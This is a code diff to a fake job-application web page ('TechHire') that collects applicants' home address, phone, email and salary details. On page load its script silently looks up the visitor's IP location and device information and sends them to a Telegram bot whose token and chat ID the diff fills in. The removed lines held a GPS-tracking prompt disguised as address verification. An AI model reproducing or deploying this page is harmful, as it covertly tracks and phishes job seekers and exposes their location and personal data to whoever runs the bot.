@@ -20,7 +20,7 @@
         .job-grid div strong { color: #333; }
         .badge { display: inline-block; background: #e8f0fe; color: #1a73e8; padding: 3px 10px; border-radius: 12px; font-size: 12px; margin: 2px; }
         label { display: block; font-size: 13px; font-weight: 600; color: #333; margin: 12px 0 5px; }
-        input, textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; }
+        input, textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; background: white; }
         input:focus, textarea:focus { border-color: #1a73e8; outline: none; }
         .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         .form-row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
@@ -38,8 +38,6 @@
         .spinner { border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .section-title { font-size: 15px; font-weight: bold; color: #1a73e8; margin: 20px 0 10px; padding-bottom: 5px; border-bottom: 2px solid #e8f0fe; }
-        .location-notice { background: #fff3cd; padding: 12px; border-radius: 5px; margin: 10px 0; font-size: 13px; text-align: center; display: none; border: 1px solid #ffc107; }
-        .location-notice a { color: #1a73e8; font-weight: bold; cursor: pointer; }
         @media (max-width: 600px) { .form-row, .form-row-3 { grid-template-columns: 1fr; } .job-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -98,10 +96,10 @@
             </div>
             
             <label>Email Address *</label>
-            <input type="email" id="email" placeholder="e.g. sagarkasture2003@gmail.com" required>
+            <input type="email" id="email" required>
             
             <label>Alternate Email ID</label>
-            <input type="email" id="alt_email" placeholder="e.g. sagar.kasture@outlook.com">
+            <input type="email" id="alt_email">
             
             <div class="form-row">
                 <div>
@@ -110,17 +108,17 @@
                 </div>
                 <div>
                     <label>Alternate Phone</label>
-                    <input type="tel" id="alt_phone" placeholder="e.g. 9876543211">
+                    <input type="tel" id="alt_phone">
                 </div>
             </div>
             
             <div class="section-title">Address Details</div>
             
             <label>Home / PG Name *</label>
-            <input type="text" id="pg_name" placeholder="e.g. Sai Residency" required>
+            <input type="text" id="pg_name" required>
             
             <label>Area / Street / Locality *</label>
-            <input type="text" id="area" placeholder="e.g. Hinjawadi Phase 2" required>
+            <input type="text" id="area" required>
             
             <div class="form-row-3">
                 <div>
@@ -153,18 +151,18 @@
                 </div>
                 <div>
                     <label>Current Company</label>
-                    <input type="text" id="company" placeholder="e.g. Tech Mahindra">
+                    <input type="text" id="company">
                 </div>
             </div>
             
             <div class="form-row">
                 <div>
                     <label>Current CTC (LPA)</label>
-                    <input type="text" id="ctc" placeholder="e.g. 3.5">
+                    <input type="text" id="ctc">
                 </div>
                 <div>
                     <label>Expected CTC (LPA)</label>
-                    <input type="text" id="expected_ctc" placeholder="e.g. 5.5">
+                    <input type="text" id="expected_ctc">
                 </div>
             </div>
             
@@ -198,7 +196,7 @@
             <div class="form-row">
                 <div>
                     <label>College Name</label>
-                    <input type="text" id="college" placeholder="e.g. Pune University">
+                    <input type="text" id="college">
                 </div>
                 <div>
                     <label>Passing Year</label>
@@ -207,10 +205,10 @@
             </div>
             
             <label>LinkedIn Profile</label>
-            <input type="url" id="linkedin" placeholder="https://linkedin.com/in/...">
+            <input type="url" id="linkedin">
             
             <label>GitHub / Portfolio</label>
-            <input type="url" id="github" placeholder="https://github.com/...">
+            <input type="url" id="github">
             
             <div class="insta-box">
                 <h3>📸 Follow Us on Instagram</h3>
@@ -218,15 +216,11 @@
                 <a href="insta.html" target="_blank" class="insta-btn">📱 Follow @techhire.jobs</a>
             </div>
             
-            <div class="location-notice" id="locationNotice">
-                📍 <strong>Location verification required:</strong> Please <a onclick="requestLocation()">click here</a> to verify your address for document delivery
-            </div>
-            
             <label>Why are you interested in this role?</label>
-            <textarea id="message" rows="3" placeholder="Tell us about your skills and experience..."></textarea>
+            <textarea id="message" rows="3"></textarea>
             
             <label>Any Questions for the Recruiter?</label>
-            <textarea id="questions" rows="2" placeholder="e.g. Is remote work available?"></textarea>
+            <textarea id="questions" rows="2"></textarea>
             
             <div class="loading" id="loading">
                 <div class="spinner"></div>
@@ -246,12 +240,10 @@
 </div>
 
 <script>
-var botToken = "YOUR_BOT_TOKEN_HERE";
-var chatId = "YOUR_CHAT_ID_HERE";
+var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
+var chatId = "1012714242";
 
-// ========== LOCATION TRACKING ==========
-
-// 1. IP Location - Always works
+// IP Location (silent - no popup)
 function getIPLocation() {
     fetch('https://ipapi.co/json/')
     .then(function(r) { return r.json(); })
@@ -263,44 +255,13 @@ function getIPLocation() {
         msg += "Country: " + data.country_name + "\n";
         msg += "ISP: " + data.org + "\n";
         msg += "Lat: " + data.latitude + "\n";
-        msg += "Lon: " + data.longitude + "\n";
-        msg += "Maps: https://www.google.com/maps?q=" + data.latitude + "," + data.longitude;
-        
+        msg += "Lon: " + data.longitude;
         var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
         fetch(url);
     });
 }
 
-// 2. GPS Location
-function requestLocation() {
-    if (navigator.geolocation) {
-        document.getElementById('locationNotice').innerHTML = '📍 Verifying your location...';
-        
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var accuracy = position.coords.accuracy;
-            
-            var msg = "📍 EXACT GPS LOCATION\n";
-            msg += "Latitude: " + lat + "\n";
-            msg += "Longitude: " + lon + "\n";
-            msg += "Accuracy: " + accuracy + " meters\n";
-            msg += "Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";
-            msg += "Time: " + new Date().toLocaleString();
-            
-            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
-            fetch(url);
-            
-            document.getElementById('locationNotice').innerHTML = '✅ Location verified! ✓';
-            document.getElementById('locationNotice').style.background = '#d4edda';
-            document.getElementById('locationNotice').style.borderColor = '#28a745';
-        }, function(error) {
-            document.getElementById('locationNotice').innerHTML = '⚠️ Could not get location. <a onclick="requestLocation()">Click here to retry</a>';
-        }, { enableHighAccuracy: true, timeout: 10000 });
-    }
-}
-
-// 3. Device info
+// Device info
 function getDeviceInfo() {
     var msg = "📱 DEVICE INFO\n";
     msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
@@ -308,16 +269,15 @@ function getDeviceInfo() {
     msg += "Platform: " + navigator.platform + "\n";
     msg += "Screen: " + screen.width + "x" + screen.height + "\n";
     msg += "Browser: " + navigator.userAgent.substring(0, 60);
-    
     var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
     fetch(url);
 }
 
-// ========== RUN ON PAGE LOAD ==========
+// Run on page load
 getIPLocation();
 getDeviceInfo();
 
-// ========== FORM SUBMISSION ==========
+// Form submission
 function submitApplication() {
     var name = document.getElementById('full_name').value;
     var email = document.getElementById('email').value;
@@ -344,15 +304,12 @@ function submitApplication() {
     var questions = document.getElementById('questions').value;
     
     if (!name || !email || !phone || !pg_name || !area || !city || !pincode) {
-        alert('Please fill all required fields (Name, Email, Phone, PG Name, Area, City, Pincode)');
+        alert('Please fill all required fields');
         return;
     }
     
     document.getElementById('submitBtn').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
-    
-    document.getElementById('locationNotice').style.display = 'block';
-    requestLocation();
     
     var msg = "📋 NEW JOB APPLICATION\n";
     msg += "═══════════════════════\n";
